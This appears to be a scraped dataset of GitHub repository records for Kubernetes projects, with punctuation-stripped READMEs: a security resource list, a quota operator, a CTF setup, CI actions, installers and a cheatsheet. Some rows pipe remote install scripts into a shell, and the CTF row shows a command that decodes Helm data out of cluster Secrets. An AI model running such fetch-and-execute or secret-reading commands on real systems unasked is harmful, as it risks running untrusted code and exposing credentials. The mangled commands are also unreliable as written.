security audit findings Kubernetes 20Threat 20Model pdf Kubernetes Attack Tree https github com cncf financial user group tree master projects k8s threat model Attacking Kubernetes A Guide for Administrators and Penetration Testers https raw githubusercontent com kubernetes community master wg security audit findings AtredisPartnersAttackingKubernetes v1 0 pdf CIS Kubernetes Benchmark v1 5 0 https www cisecurity org benchmark kubernetes Kubernetes seguro por default ou prova de m configura o https medium com p0ssuidao kubernetes C3 A9 seguro por default ou aprova de m C3 A1 configura C3 A7 C3 A3o 9d3bccc2f342 Recorded Talks Videos Advanced Persistence Threats The Future of Kubernetes Attacks RSAC 2020 https www youtube com watch v CH7S5rE3j8w Kubernetes Security Best Practices Ian Lewis Google https www youtube com watch v wqsUfvRyYpw Securing Kubernetes Secrets Cloud Next 19 https www youtube com watch v DNKcRUyz4Hw Jay Beale Attacking and Defending Kubernetes DEF CON 27 Packet Hacking Village https www youtube com watch v 2fmAuR3rnBo The State of Kubernetes Security Liz Rice https www youtube com watch v l56oUxHSio DIY Pen Testing for Your Kubernetes Cluster Liz Rice Aqua Security https www youtube com watch v fVqCAUJiIn0 Presentations Slides Communication is Key Understanding Kubernetes Networking KubeCon EU 2020 https static sched com hostedfiles kccnceu20 3d CommunicationisKey pdf Seccomp Profiles and you A practical guide KubeCon EU 2020 https www slideshare net DuffieCooley seccomp profiles and you a practical guide Advanced Persistence Threats The Future of Kubernetes Attacks KubeCon EU 2020 https speakerdeck com iancoldwater advanced persistence threats the future of kubernetes attacks Help My Cluster Is On The Internet bit ly SamK8sSec Tools Open Source projects Learning Bust a Kube https www bustakube com kube goat https github com ksoclabs kube goat Kubernetes Goat https github com madhuakula kubernetes goat Kubernetes networking labs for KubeCon EU 2020 talk https github com korvus81 k8s net labs Certified Kubernetes Security Specialist CKS https github com walidshaari Certified Kubernetes Security Specialist Attacking kube hunter https github com aquasecurity kube hunter Peirates https github com inguardians peirates Defending Kubernetes Audit by Trail of Bits https github com trailofbits audit kubernetes falco https github com falcosecurity falco kubesec https github com controlplaneio kubesec kube bench https github com aquasecurity kube bench trivy https github com aquasecurity trivy MKIT https github com darkbitio mkit kubetap https github com soluble ai kubetap kube forensics https github com keikoproj kube forensics k8s security dashboard https github com k8scop k8s security dashboard CIS Kubernetes Benchmark InSpec Profile https github com dev sec cis kubernetes benchmark Kube PodSecurityPolicy Advisor https github com sysdiglabs kube psp advisor Inspektor Gadget https github com kinvolk inspektor gadget Starboard https github com aquasecurity starboard Advocacy Site for Kubernetes RBAC https github com mhausenblas rbac dev Helm Snyk https github com snyk labs helm snyk Krane https github com appvia krane rakkess https github com corneliusweig rakkess kubectl who can https github com aquasecurity kubectl who can Trainings Secure Kubernetes https securekubernetes com Cloud Native Security Tutorial https tutorial kubernetes security info Kubernetes Security Advanced Concepts https linuxacademy com course kubernetes security advanced concepts Kubernetes Goat Guide https madhuakula com kubernetes goat Katacoda Kubernetes Goat Videos https katacoda com madhuakula scenarios kubernetes goat Attacking and Auditing Docker Containers and Kubernetes Clusters https github com appsecco attacking and auditing docker containers and kubernetes clusters Linux Academy ACloudGuru Kubernetes security course https acloud guru learn 7d2c29e7 cdb2 4f44 8744 06332f47040e SANS cloud native security defending containers and kubernetes https www sans org event stay sharp blue team ops and cloud dec 2020 course cloud native security defending containers kubernetes Getting Started With Cloud Native Security Kubecon EU 2020 tutroial Liz Rice Aqua Security Michael Hausenblas https youtu be MisS3wSds40 Control Plane security training https control plane io training Certified Kubernetes Security Specilaist CKS practice simulation exam https killer sh cks Other Awesome Lists kubepwn https github com alexivkin kubepwn awesome kubernetes security https github com ksoclabs awesome kubernetes security awesome kubernetes https github com ramitsurana awesome kubernetes,2020-07-06T14:30:18Z,2020-12-26T17:01:14Z,n/a,User,8,62,13,14,master,magnologan#walidshaari#P0ssuidao,3,0,0,0,1,0,3
spring2go,k8s-msa-in-action-ppt,,k8s msa in action ppt Kubernetes ppt,2020-04-05T02:39:23Z,2020-12-24T22:40:39Z,n/a,Organization,8,57,38,8,master,archbobo,1,0,0,0,0,0,0
ca-gip,kotary,cpu#k8s#k8s-operator#kubernetes#kubernetes-controller#kubernetes-operator#memory#overcommit#resource-allocation#resource-management#resource-manager#resourcequota,Managing Kubernetes Quota with confidence Kotary Table of Contents What is it what is it Why not use an admission controller why not use an admission controller Adding or Scaling Up a Quota adding or scaling up a quota Installation installation Add the CRD add the crd Configuration configuration Options options Example example Deployment deployment Deploy the controller deploy the controller Optional Deploy the service monitor optional deploy the service monitor Getting Started getting started Update a ResourceQuota update a resourcequota Example example 1 Status status Example of a rejected claim example of a rejected claim Example of a pending claim example of a pending claim Default claim default claim Plan plan Manage manage Global global Namespaces namespaces Namespace Details namespace details What is it It is an operator that brings a layer of verification and policy to the native ResourceQuotas mechanism It introduced a new resource call a ResourceQuotaClaims that will let users ask to modify the specification of their quota The verification includes There are enough resources CPU and Memory on the cluster to allocate the claim which will look at the total amount of resources of the cluster worker node and the sum of all the other ResourceQuotas Optional It respects the maximum bound value express as a ratio of the cluster resource ex a namespace cannot claim more that a 1 3 of the cluster Optional In order to have some flexibility it is possible to set an over commit or under commit ratio to set what is claimable compared to the actual resources ex In a development environment you could choose to allow reserving more resources than what is actually usable in reality In order to facilitate the adaption of ResourceQuotaClaims it is possible to enforce a default claim for namespaces The feature will be activated on namespace that contains the label quota managed Why not use an admission controller It could have been an elegant solution to use the admission controller mechanism in Kubernetes This would have avoided the use of a Custom Resource Definition by directly asking to modify a ResourceQuotas In the meantime this would have left out users on managed cluster like EKS AKS or GKE this is why we implemented the operator pattern instead Adding or Scaling Up a Quota How Kotary verification process work when you add a claim or request a scale up https i imgur com r0nIXl5 gif Installation Add the CRD bash kubectl apply f https raw githubusercontent com ca gip kotary master artifacts crd yml Configuration Options Name Description Mandatory Type Default defaultClaimSpec Default claim that will be added to a watched Namespace no ResourceList cpu 2 memory 6Gi ratioMaxAllocationMemory Maximum amount of Memory claimable by a Namespace no Float 1 ratioMaxAllocationCPU Maximum amount of CPU claimable by a Namespace no Float 1 ratioOverCommitMemory Memory over commitment no Float 1 ratioOverCommitCPU CPU over commitment no Float 1 Example In the following sample configuration we set A default claim of 2 CPU and 10Gi of Memory 33 of total amount of resource can be claim by a namespace An over commit of 130 bash cat EOF kubectl n kube system create f apiVersion v1 kind ConfigMap data defaultClaimSpec cpu 2 memory 10Gi ratioMaxAllocationMemory 0 33 ratioMaxAllocationCPU 0 33 ratioOverCommitMemory 1 3 ratioOverCommitCPU 1 3 metadata name kotary config EOF Deployment Deploy the controller bash kubectl apply f https raw githubusercontent com ca gip kotary master artifacts deployment yml Optional Deploy the service monitor bash kubectl apply f https raw githubusercontent com ca gip kotary master artifacts metrics yml Getting Started Update a ResourceQuota To update a ResourceQuotas you will have to create a ResourceQuotaClaims with specification for CPU and Memory You can use the same units as the one available in Kubernetes please refer to the official documentation https kubernetes io docs tasks administer cluster manage resources quota memory cpu namespace Example bash cat EOF kubectl apply n demo ns f apiVersion ca gip github com v1 kind ResourceQuotaClaim metadata name demo spec memory 20Gi cpu 5 EOF Status After creating a ResourceQuotaClaims there are three possibilities Accepted The claim will be deleted and the modifications are applied to the ResourceQuota Rejected It was not possible to accept the modification the claim show a status REJECTED with details Pending The claim is requesting less resources than what is currently requested on the namespace the claim will be accepted once it s possible to downscale Example of a rejected claim bash kubectl get quotaclaim NAME CPU RAM STATUS DETAILS demo 5 20Gi REJECTED Exceeded Memory allocation limit claiming 20Gi but limited to 18Gi Example of a pending claim bash kubectl get quotaclaim NAME CPU RAM STATUS DETAILS demo 5 16Gi PENDING Awaiting lower CPU consumption claiming 16Gi but current total of CPU request is 18Gi Default claim If you are using the default claim policy namespace will automatically receive a claim and if all the verifications pass a managed quota will be applied bash kubectl get resourcequota NAME CREATED AT managed quota 2020 01 24T08 31 32Z Plan Implementing ResourceQuota when you already have running workload on your cluster can be a tedious task To help you get started you can use our cli kotaplan https github com ca gip kotaplan It will enable to test various scenarios beforehand by simulating how the quota could be implemented according to the desired settings Here is a quick example bash kotaplan label quota managed cpuover 0 95 memover 0 95 memratio 0 33 cpuratio 0 33 Namespaces Details NAMESPACE PODS MEM REQ CURRENT MEM USE MEM REQ USAGE CPU REQ CURRENT CPU USE CPU REQ USAGE FIT DEFAULT RESPECT MAX ALLOCATION NS SPEC team 1 dev 14 7GiB 859 4MiB 11 9897 2800 6 0 2143 false true CPU 3360m MEM 8 4GiB team 1 int 14 7GiB 852MiB 11 8868 2800 0 0 false true CPU 3360m MEM 8 4GiB team 1 prd 16 8GiB 1 125GiB 14 0568 3200 0 0 false true CPU 3840m MEM 9 6GiB team 2 dev 16 8GiB 1 119GiB 13 9935 3200 0 0 false true CPU 3840m MEM 9 6GiB team 2 dev 8 4GiB 531 4MiB 12 9745 1600 0 0 false true CPU 1920m MEM 6GiB team 2 dev 28 9GiB 1 033GiB 11 4748 3600 6 0 1667 false true CPU 4320m MEM 10 8GiB team 3 dev 0 0B 0B 0 0 0 0 true true CPU 1000m MEM 6GiB team 3 prd 0 0B 0B 0 0 0 0 true true CPU 1000m MEM 6GiB 8 96 CPU 22692M MEM 64 8 GIB Summary Number of nodes 8 Available resources real CPU 64000m MEM 250 5GiB Available resources commit CPU 60800m MEM 238GiB Max per NS CPU 21120m MEM 82 67GiB RESULT OK Manage To help you manage effectively your ResourceQuotas you can use the provided Granafa dashboard You will be able to set it up according to your configuration by modifying the dashboard variable Global The global section will enable users to check the current running configuration manual to size accordingly their claims It also shows what is currently available reserved and claimable in terms of resources grafanaglobal assets grafanaglobal png Namespaces This section list all the managed namespaces to give a rough idea of what is currently use by running containers It allows to rapidly checks which quota should be increased or decreased grafananamespaces assets grafananamespaces png Namespace Details This section shows a detailed view of the Memory and CPU consumption on a particular namespace It allows to visually check what the specifications of the quota the total amount of request made by containers and their real consumption grafananamespacedetails assets grafananamespacedetails png,2020-06-02T08:34:35Z,2020-12-14T18:12:59Z,Go,Organization,3,57,5,0,master,,0,1,1,0,0,0,1
korvus81,k8s-net-labs,,k8s net labs Kubernetes networking labs for KubeCon EU 2020 talk After cloning this repo to follow along you either need to install Docker https docs docker com get docker https docs docker com get docker Footloose https github com weaveworks footloose install https github com weaveworks footloose install Or have a working Vagrant VirtualBox setup the Vagrantfile in this repo has the appropriate Docker Footloose setup already in it Running Docker Footloose natively is prefered for resource consumption reasons Once you are either SSH d in to the Vagrant box vagrant up vagrant ssh or have Docker Footloose set up you will probably need to become root to fully support Footloose sudo s su or however you prefer You need to be in the folder for this repo mounted to labs if you are in the Vagrant box Then to start the different environments you can cd to the directory you want flannel for k3s with Flannel or calico for k3s with Calico then run bootstrap sh for the Flannel one or bootstrap calico sh for the Calico one to start the k3s install Once the cluster is up you can SSH in with either footloose ssh root node0 or node1 or node2 for the Flannel install or footloose c footloose calico yaml ssh root calico node0 or calico node1 or calico node2 for the Calico install For the Calico install you bring up Calico with kubectl apply f calico k3s yaml when on calico node0,2020-07-31T13:50:01Z,2020-12-17T23:05:13Z,Shell,User,9,56,35,6,master,korvus81,1,0,0,1,0,0,0
progapandist,progapanda.org,docker#golang#k3s#k8s#repl#sandbox#shell#sveltejs#websocket#xterm-js,progapanda org Source code for link https progapanda org TUI doc tui png Shell doc term png Stack Go Gorilla Mux gorilla WebSocket electricplug tview https github com rivo tview for Go TUI tv gist with TUI code https gist github com progapandist 97f7ccc8169b792e2d0b4a6aab6faf9b Svelte js nailcare Xterm js computer Docker ship k3s with k3sup https github com alexellis k3sup tomato Digital Ocean 10 droplet okhand Why This is part of my research for creating scalable online coding environments for programming students at Le Wagon https www lewagon com Other OSS projects lewagon wait on check action https github com lewagon wait on check action the GitHub Action that can be used to halt any workflow until required checks for a given ref pass successfully lewagon foottraffic https github com lewagon foottraffic pure Ruby DSL for Chrome scripting based on Ferrum No Selenium required Works from any script Simulate web app usage scenarios in production or locally lewagon quay github actions dispatch https github com lewagon quay github actions dispatch a tiny web service for securely forwarding Quay build notifications to Github Action s repositorydispatch webhook A missing link for creating powerful build flows with Quay and GHA Contact me andrey lewagon org License MIT,2020-05-24T18:17:50Z,2020-12-11T10:05:21Z,Go,User,3,53,0,30,master,progapandist,1,0,0,1,1,1,2
NodyHub,k8s-ctf-rocks,,Kubernetes CTF These are all resource that are used to setup the Kubernetes Easter CTF The CTF was hosted on http k8s ctf rocks and ended with the end of eastern The CTF itself was hosted on Amazon EKS This repository contains a Vagrantfile Vagrantfile for HashiCorp Vagrant https www vagrantup com that allows you to setup the CTF locally There might be some parts undocumented or not perfectly working that I forgot to document Feel free to reach out and we can fix it Setup k8s easter ctf png Setup with Vagrant To simplify the Installation a Vagrantfile Vagrantfile is supplied to bootstraps the CTF local on an Ubuntu VM k3s You can start it with bash vagrant up Even if the VM is started the cluster needs some time to pull all images The status of the deployment can be checked with following commands bash Connect to vm vagrant ssh Get status of pods kubectl get pods all namespaces As soon as the Status is Running or Completed the cluster can be accessed on http localhost 8080 http localhost 8080 Configuration Most of the configurations can be in adjusted in the config config config The vagrant setup depends on k3s and needs according to the documentation https rancher com docs k3s latest en installation network options some manual adjustment of the calico deployment Install k3s In case you want to deploy it on an existing maschine k3s can installed as following bash config curl sfL https get k3s io INSTALLK3SEXEC cluster cidr PODSUBNET service cidr SVCSUBNET write kubeconfig mode 644 no flannel sudo E sh sleep 5 kubectl apply f calico yaml mkdir p kube ln s etc rancher k3s k3s yaml kube config Install Helm The Kubernetes resources are written in Helm 3 Charts Following commands are necessary to install Helm 3 bash curl fsSL o gethelm sh https raw githubusercontent com helm helm master scripts get helm 3 chmod 700 gethelm sh gethelm sh rm gethelm sh helm repo add stable https kubernetes charts storage googleapis com Deploy CTF The CTF can as well deployed with Helm 3 to an existing cluster with the following command bash install with helm sh And don t forget to adjust the configuration in the config config Docker Images The Dockerfiles are stored in the docker images docker images directory The images are build automatically by GitHub Actions and published on Docker Hub nodyd e20 entry https hub docker com r nodyd e20 entry nodyd e20 ssh https hub docker com r nodyd e20 ssh nodyd e20 egg https hub docker com r nodyd e20 egg Fixed issues Helm 3 stores all details about the different deployments in the Kubernetes Secrets Since I stored one EGG in the kubernetes Secret API the Helm secrets were as well available According to Issue 6409 https github com helm helm issues 6409 you can decode the complete deployment with 2x base64 decode gunzp kubectl get secrets o json jq data release r base64 decode base64 decode gunzip and all the Kubernetes magic was gone xD I deleted the Secrets during the CTF manually to avoid the info leak For now I relocated the Helm meta info to another namespace I deployed Datadog Cloud Monitoring https www datadoghq com for the very first time on a cluster It is nice as an operator to have fancy charts and stats to name an advantage Another advantage was for the CTF participants was the service kube state metrics which exposed the whole log of my overall deployment After deploying an additional NetworPolicy datadog metric np yaml the service was not anymore available,2020-04-08T09:48:48Z,2020-12-26T23:26:47Z,Smarty,User,2,50,9,26,master,NodyHub#0xmilkmix,2,0,0,1,0,0,1
werf,actions,action#continuous-delivery#continuous-integration#devops#docker#dockerfile#github-actions#gitops#k8s#werf,This action set allows you to organize CI CD with GitHub Actions and werf https github com werf werf The set consists of several independent and complex actions werf actions converge https github com werf actions tree master converge werf actions build and publish https github com werf actions tree master build and publish werf actions build https github com werf actions tree master build werf actions publish https github com werf actions tree master build werf actions deploy https github com werf actions tree master deploy werf actions dismiss https github com werf actions tree master dismiss werf actions run https github com werf actions tree master run werf actions cleanup https github com werf actions tree master cleanup Each action combines all the necessary steps in itself and logic may be divided into environment setup and launching the corresponding command Ready to use GitHub Actions Workflows for different CI CD workflows are available here https werf io documentation advanced cicd githubactions html complete set of configurations for ready made workflows Also there is another action werf actions install https github com werf actions tree master install With this action a user can just install werf and use binary within job steps for own purposes Environment setup in details werf binary setup By default all actions setup actual werf version for 1 1 alpha channel https werf io releases html more details about channels werf release cycle and compatibility promise here https github com werf werf backward compatibility promise Using group and channel inputs the user can switch the release channel This is recommended approach to be up to date and to use actual werf version without changing configurations yaml uses werf actions converge master with group 1 1 channel alpha Withal it is not necessary to work within release channels and the user might specify certain werf version with version input yaml uses werf actions converge master with version v1 1 16 kubeconfig setup optional The kubeconfig may be used for deployment cleanup distributed locks and caches Thus the configuration should be added before step with the action or passed as base64 encoded data with kube config base64 data input Prepare kubeconfig e g cat kube config base64 and save in GitHub Project Secrets e g with name KUBECONFIGBASE64DATA Pass secret with kube config base64 data input yaml uses werf actions build and publish master with kube config base64 data secrets KUBECONFIGBASE64DATA werf ci env This command performs docker login using github token sets up predefined variables based on GitHub Workflow context Note that github token is optional in this action and the input is there in case you need to use a non default token By default action will use the token provided to your workflow Working with werf options Any werf option can be defined with environment variables yaml uses werf actions build and publish master env WERFLOGVERBOSE on WERFTAGCUSTOMTAG1 tag1 WERFTAGCUSTOMTAG2 tag2 Examples converge yaml converge name Converge runs on ubuntu latest steps name Checkout code uses actions checkout v2 with fetch depth 0 name Converge uses werf actions converge master with env production kube config base64 data secrets KUBECONFIGBASE64DATA build publish and deploy yaml build and publish name Build and Publish runs on ubuntu latest steps name Checkout code uses actions checkout v2 with fetch depth 0 name Build and Publish uses werf actions build and publish master with kube config base64 data secrets KUBECONFIGBASE64DATA deploy name Deploy needs build and publish runs on ubuntu latest steps name Checkout code uses actions checkout v2 with fetch depth 0 name Deploy uses werf actions deploy master with env production kube config base64 data secrets KUBECONFIGBASE64DATA dismiss yaml dismiss name Dismiss runs on ubuntu latest steps name Checkout code uses actions checkout v2 name Dismiss uses werf actions dismiss master with kube config base64 data secrets KUBECONFIGBASE64DATA env production run yaml run name Run runs on ubuntu latest steps name Checkout code uses actions checkout v2 with fetch depth 0 name Run uses werf actions run master with image backend args rails server kube config base64 data secrets KUBECONFIGBASE64DATA env WERFDOCKEROPTIONS d p 3000 3000 cleanup yaml cleanup name Cleanup runs on ubuntu latest steps name Checkout code uses actions checkout v2 name Fetch all history for all tags and branches run git fetch prune unshallow name Cleanup uses werf actions cleanup master with kube config base64 data secrets KUBECONFIGBASE64DATA install yaml werf name werf runs on ubuntu latest steps name Checkout code uses actions checkout master name Install werf CLI uses werf actions install master for deploy and distributed locks name Create kube config run KUBECONFIG mktemp d config base64 d KUBECONFIG echo KUBECONFIG KUBECONFIG GITHUBENV env KUBECONFIGBASE64DATA secrets KUBECONFIGBASE64DATA name Run werf commands run source werf ci env github as file werf build and publish werf deploy env GITHUBTOKEN github token WERFENV production License Apache License 2 0 see LICENSE LICENSE,2020-05-25T13:00:35Z,2020-11-26T09:50:18Z,JavaScript,Organization,4,50,0,39,master,alexey-igrychev,1,1,1,0,0,0,19
jsonnet-libs,k8s-alpha,,k8s alpha This repository contains artifacts of the very new Jsonnet Kubernetes library generator k8s gen located at https github com jsonnet libs k8s Usage With Tanka https tanka dev bash set up Tanka project we will install k8s ourselves tk init k8s false pull k8s alpha for Kubernetes 1 18 jb install github com jsonnet libs k8s alpha 1 18 Then put the following into lib k libsonnet jsonnet import github com jsonnet libs k8s alpha 1 18 main libsonnet If you happen to use ksonnet lib kausal libsonnet also add jsonnet import github com jsonnet libs k8s alpha 1 18 extensions kausal shim libsonnet Standalone bash jb install github com jsonnet libs k8s alpha 1 18 Then import it in your project jsonnet local k import github com jsonnet libs k8s alpha 1 18 main libsonnet FAQ Is it stable We don t know It seems to work pretty well but it is very young code so it is not battle tested The API aims to be very similar to ksonnet gen but not 100 the same to allow enough room for important improvements If something does not look as expected please open an issue at https github com jsonnet libs k8s Shall I use it Yes please We need to get as much feedback as possible to enhance it so it s your chance to be part of that Why a new generator The original generator located at https github com ksonnet ksonnet gen is not maintained anymore and only provides artifacts for Kubernetes versions up to v1 14 What about kube jsonnet k https github com kube jsonnet k The ksonnet gen software was forked and updated at https github com kube jsonnet k by RedHat and Grafana Labs the same company behind this project While working on it we quickly realized that the overall code complexity performance and correctness is far from what we desire and decided to switch efforts to rewriting it from scratch The result of that is https github com jsonnet libs k8s and expected to replace both https github com ksonnet ksonnet gen and https github com kube jsonnet k as soon as possible Where can I find documentation The generated docs can be found here https jsonnet libs github io k8s alpha I found a bug where can I report this Great let s try and fix that please report issues in https github com jsonnet libs k8s,2020-05-07T13:23:32Z,2020-12-09T19:56:47Z,Jsonnet,Organization,8,42,4,17,master,sh0rez#malcolmholmes#Duologic#justinwalz,4,0,0,2,0,2,3
Xabaril,lucecu,dotnet#k8s#operator#templates,Lucecu CD Build https github com Xabaril lucecu workflows Lucecu 20CD 20Build badge svg Lucecu CI Build https github com xabaril Lucecu workflows Lucecu 20CI 20Build badge svg branch master About Lucec Lucec is the Xabaril repository for custom DotNet templates Our goal is to simplify the initial scaffolding of some scenarios where DotNet does not have a template yet At the moment the templates included in this repository are K8S Operator pattern k8s operator pattern template How to build Lucec is built against the latest NET Core 3 Install https www microsoft com net download core current the required https github com Xabaril Esquio blob master global json NET Core SDK Run dotnet new i src templates k8soperator in the root of the repo for building k8s template K8S Operator pattern template This template creates the default scaffolding project to create a Kubernetes operator including Project scaffolding A Simple CRD YAML templates for deploy CRD A CRD watcher A Kubernetes controller with Kubernetes client dependency To get more information please checkout our Getting Starting with K8S Operator template docs GettingStarted K8SOperator md Acknowledgements Lucec is built using the following great open source projects and free services ASP NET Core https github com aspnet Serilog https github com serilog serilog and last but not least a big thanks to all our contributors https github com Xabaril Lucecu graphs contributors Code of conduct This project has adopted the Microsoft Open Source Code of Conduct https opensource microsoft com codeofconduct For more information see the Code of Conduct FAQ https opensource microsoft com codeofconduct faq or contact opencode microsoft com mailto opencode microsoft com with any additional questions or comments,2020-04-08T11:10:55Z,2020-10-01T07:18:05Z,C#,Organization,6,42,1,51,master,unaizorrilla#carlosrecuero#CarlosLanderas#eiximenis,4,0,5,1,13,0,11
liyongjian5179,k8s-ansible,ansible#binary#ha#k8s#kubernetes,k8s ansible groupvars all inventory hosts ansible bash ansible yum install y ansible etc hosts vim etc hosts your ip 1 your host name 1 your ip 2 your host name 2 your ip 3 your host name 3 hostnamectl set hostname your host name x ssh copy id root your host ip or name x K8SSERVERVER 1 18 8 ETCDVER 3 4 9 FLANNELVER 0 12 0 CNIPLUGINVER 0 8 6 CALICOVER 3 15 0 DOCKERVER 19 03 10 pod 10 244 0 0 16 service 10 96 0 0 12 kubernetes 10 96 0 1 coredns 10 96 0 10 IP k8s centos7 nginx 10 10 10 127 nginx nginx ansible centos7 a 10 10 10 128 master node etcd flannel kube apiserver kube controller manager kube scheduler kubelet kube proxy centos7 b 10 10 10 129 master node etcd flannel kube apiserver kube controller manager kube scheduler kubelet kube proxy centos7 c 10 10 10 130 master node etcd flannel kube apiserver kube controller manager kube scheduler kubelet kube proxy centos7 d 10 10 10 131 node flannel kubelet kube proxy centos7 e 10 10 10 132 node flannel kubelet kube proxy LB 6443 site yaml 2 6 Masters LB Nginx Nginx downloadbinary sh bash bash downloadbinary sh opt pkg bash wget https github com containernetworking plugins releases download v CNIPLUGINVER cni plugins linux amd64 v CNIPLUGINVER tgz wget https github com coreos flannel releases download v FLANNELVER flannel v FLANNELVER linux amd64 tar gz wget https dl k8s io v K8SSERVERVER kubernetes server linux amd64 tar gz wget https github com etcd io etcd releases download v ETCDVER etcd v ETCDVER linux amd64 tar gz wget https pkg cfssl org R1 2 cfssllinux amd64 wget https pkg cfssl org R1 2 cfssljsonlinux amd64 wget https pkg cfssl org R1 2 cfssl certinfolinux amd64 wget https github com projectcalico calicoctl releases download v CALICOCTLVER calicoctl tools movepkg sh bash bash tools movepkg sh hosts bash root centos7 nginx k8s ansible cat etc hosts 127 0 0 1 localhost localhost localdomain localhost4 localhost4 localdomain4 1 localhost localhost localdomain localhost6 localhost6 localdomain6 10 10 10 127 centos7 nginx lb 5179 top inner lb 5179 top ng 5179 top ng inner 5179 top 10 10 10 128 centos7 a 10 10 10 129 centos7 b 10 10 10 130 centos7 c 10 10 10 131 centos7 d 10 10 10 132 centos7 e bash ansible playbook i inventory hosts site yml Master bash ansible playbook i inventory hosts site yml t makemasterlabelsandtaints bash root centos7 nginx k8s ansible kubectl get nodes NAME STATUS ROLES AGE VERSION 10 10 10 128 Ready master 7m48s v1 18 8 10 10 10 129 Ready master 7m49s v1 18 8 10 10 10 130 Ready master 7m49s v1 18 8 10 10 10 131 Ready 7m49s v1 18 8 10 10 10 132 Ready 7m49s v1 18 8 root centos7 nginx k8s ansible kubectl describe nodes 10 10 10 128 grep C 3 Taints Annotations node alpha kubernetes io ttl 0 volumes kubernetes io controller managed attach detach true CreationTimestamp Thu 25 Jun 2020 17 38 09 0800 Taints node role kubernetes io master NoSchedule Unschedulable false Lease HolderIdentity 10 10 10 128 k8s IP node bash master kubectl label nodes xxx node role kubernetes io master node kubectl label nodes xxx node role kubernetes io node master master pod kubectl taint nodes xxx node role kubernetes io master NoSchedule master node kubectl taint nodes xxx node role kubernetes io master CERTPOLICY update bash ansible playbook i inventory hosts site yml t cert e CERTPOLICY update invertory hosts new nodes etc hosts bash ansible playbook i inventory hosts newnodes yml root centos7 nginx k8s ansible kubectl apply f tests myapp yaml bash root centos7 nginx k8s ansible kubectl exec it busybox sh nslookup kubernetes Server 10 96 0 10 Address 1 10 96 0 10 kube dns kube system svc cluster local Name kubernetes Address 1 10 96 0 1 kubernetes default svc cluster local nslookup myapp Server 10 96 0 10 Address 1 10 96 0 10 kube dns kube system svc cluster local Name myapp Address 1 10 102 233 224 myapp default svc cluster local curl myapp hostname html myapp 5cbd66595b p6zlp bash bash tools clean sh,2020-06-22T05:45:38Z,2020-12-02T09:29:24Z,HTML,User,2,38,11,14,master,liyongjian5179,1,0,1,1,2,0,2
TarsCloud,K8STARS,cloud-native#kubernetes#microservice#tars,Read Chinese Version READMEcn md K8STARS K8STARS is a convenient solution to run TARS services in kubernetes Characteristics Maintain the native development capability of TARS Automatic registration and configuration deletion of name service for TARS Support smooth migration of original TARS services to K8S and other container platforms Non intrusive design no coupling relationship with operating environment How it works 1 Three interfaces are added in the tarsregistry which are used for automatic registration heartbeat reporting and node offline For details please refer to interface definition tarsregistry protocol tarsregistry tars 2 A tarscli command line tool is provided to allocate ports generate configuration report heartbeat and node offline Deployment examples 1 Deployment tars basic service curl https raw githubusercontent com TarsCloud K8STARS master baseserver installall sh sh 2 Deployment service example Deploy sample simpleserver cd examples simple kubectl apply f simpleserver yaml Example description The image is created by the examples simple dockerfile file and the basic image is created by cmd tarscli dockerfile start sh tarscli genconf in is used to generate the tars service startup configuration server meta yaml The file is used to configure the metadata of the service For field information please refer to app genconf config go structure ServerConf Endpoint defaults to tcp h localip p randomport supports automatic filling of IP and random ports ased on Golang HelloWorld program TestApp HelloGo See examples README md examples 3 Verify the deployment Login dbtars then execute select from tserverconfG The node information of simpleserver has been registered automatically Tars deployment directory structure tarscli based on environment variable TARSPATH default tars to manage services The directory functions are as follows TARSPATH bin Startup scripts and binaries TARSPATH conf Configuration file TARSPATH log Log file TARSPATH data Runtime Cache file About tarscli tarscli provides a set of command tools to facilitate container deployment of TARS services Parameters can be specified through environment variables For details see tarscli help Here are the sub commands supported by tarscli genconf is used to generate the startup configuration file of the TARS service The supported environment variables are TARSAPPLICATION the application name specified By default the server meta yaml Read from TARSSERVER is the service name specified by the server meta yaml Read from TARSBUILDSERVER the service name at compile time It will be used when the compiled service name is different from the running service name TARSLOCATOR can specify the address of registry The default is tars tarsregistry QueryObj tcp h tars registry tars system svc cluster local p 17890 address of service TARSSETID can specify service set TARSMERGEConf can specify the configuration template file and merge the configuration into the service startup configuration file supervisor executes the genconf command by default and then starts and monitors the service The supported environment variables are TARSSTARTPATH The startup script of the service TARSPATH bin start sh TARSSTOPPATH The stop script by default kill all service processes under path TARSPATH TARSREPORTINTERVAL reports the interval heartbeat to registry TARSDISABLEFLOW whether to enable traffic when registering with registry If it is not empty it means it is off It is enabled by default TARSCHECKINTERVAL check the service status interval If the status changes it will be synchronized to the registry in real time TARSBEFORECHECKSCRIPT the shell command that runs before each check TARSCHECKSCRIPTTIMEOUT the timeout to run the shell command before each check TARSPRESTOPWAITTIME turn off traffic the waiting time before stopping the service It is used for lossless changes The default value is 80 seconds hzcheck is used to synchronize the service status and the pod status of k8s You need to set the readiness Probe of pod to tarscli hzcheck command prestop is used to delete the configuration corresponding to the registry before the service exits TARSPRESTOPWAITTIME turn off traffic the waiting time before stopping the service It is used for lossless changes The default value is 80 seconds notify is used to send management commands The common commands are tars setloglevel tars pprof etc Basic services TARS related basic services provide rich service governance functions Please refer to baseserver baseserver for deployment,2020-07-17T06:20:21Z,2020-12-24T12:23:42Z,Go,Organization,15,37,9,93,master,defool#andyguo1023#bartdong#marklightning#KatharineOzil#hpeiy98#woluohenga#freelw,8,0,8,0,4,0,19
vladwa,kuberenetes-kubectl-cheatsheet,cheatsheets#cka#cka-commands#ckad-commands#docker#k8s#kubectl#kubectl-cheatsheet#kubectl-command#kubernetes#kubernetes-che#kubernetes-cluster,Kubernetes kubectl cheatsheet Kubernetes Components https kubernetes io docs concepts overview components Control Plane Components Master Nodes Component Name Summary Runs As kube apiserver Exposes the Kubernetes API from master nodes The API server is the front end for the Kubernetes control plane Can run several instances of kube apiserver and balance traffic between those instances Static Pod etcd Consistent and highly available key value store used as Kubernetes backing store for all cluster data Static Pod or Systemd service kube scheduler Component that watches for newly created Pods with no assigned node and selects a node for them to run on Static Pod kube controller manager Component that runs controller processesnode Controllers include Node Controller Replication Controller Endpoints Controller Service Account Token Controllers Static Pod Node Components Worker Nodes Component Name Summary Runs As kubelet An agent that runs on each node in the cluster It makes sure that containers are running in a Pod System process kube proxy kube proxy is a network proxy that runs on each node in your cluster implementing part of the Kubernetes Service concept Daemonset Container Runtime Is the software that is responsible for running containers Kubernetes supported runtimes Docker rkt runc and any https github com opencontainers runtime spec OCI runtime spec implementation Systemd service Master and Worker nodes ports alt text ports png Generators https kubernetes io docs reference kubectl conventions generators You can create the following resources usingkubectl runwith the generatorflag Resource api group kubectl command Pod v1 kubectl run generator run pod v1 Replication controller deprecated v1 kubectl run generator run v1 Deployment 